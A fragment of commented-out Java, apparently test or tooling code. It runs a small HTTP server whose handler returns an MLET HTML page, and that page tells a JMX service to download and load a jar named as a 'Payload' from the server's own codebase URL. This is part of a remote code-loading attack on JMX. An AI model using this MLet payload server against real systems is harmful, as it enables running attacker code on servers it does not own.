...
//        httpServerDefaultHandler.createServer(this::handle);
//        Thread.sleep(100);
//        httpServerDefaultHandler.stopServer();
//    }
//
//    @Override
//    public void handle(HttpExchange httpExchange) throws IOException {
...
//                    "  ARCHIVE=jmx-server.main.jar\n" +
//                    "  NAME=Payload:name=payload,id=1\n" +
//                    "  CODEBASE=" + httpServerDefaultHandler.getServerUrl() + httpServerDefaultHandler.getServerPort() + ">\n" +
//                    "</MLET>\n" +
//                    "</HTML>";
//            httpExchange.sendResponseHeaders(200, mlet_code.length());
//            OutputStream os = httpExchange.getResponseBody();
